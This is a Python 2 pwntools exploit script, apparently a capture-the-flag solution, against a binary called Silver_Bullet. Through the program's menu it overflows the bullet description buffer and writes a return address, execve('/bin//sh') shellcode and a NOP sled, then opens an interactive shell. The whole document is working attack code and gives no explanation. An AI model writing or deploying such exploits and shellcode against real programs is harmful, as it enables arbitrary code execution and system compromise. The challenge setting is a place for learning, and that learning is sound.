#!/bin/env python2
from pwn import *

p = gdb.debug('./Silver_Bullet', 'break beat')

def menu():
	print p.recvuntil('Your choice :')

def create(s):
	menu()
	p.send('0'*14+'1')
	p.recvuntil('Give me your description of bullet :')
	p.send(s.ljust(48, '\x00'))
	p.recvuntil('Good luck !!\n')

def power(s):
	menu()
	p.send('0'*14+'2')
	p.recvuntil('Give me your another description of bullet :')
	p.send(s.ljust(48, '\x00'))
	p.recvuntil('Your new power is : ')
	new_pow = int(p.recvline())
	print 'new power:', new_pow, hex(new_pow)
	p.recvuntil('Enjoy it !\n')

def beat():
	menu()
	p.send('0'*14+'3')

main = 0x08048954
test = 0x08048733
shell = '\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80'

create('\xff'*47)
power('\xff')
power('\xff'*7+p32(main+32)+shell+'\x90'*11)
#new power: 4294967088 0xffffff30
#power(cyclic(47))

p.interactive()
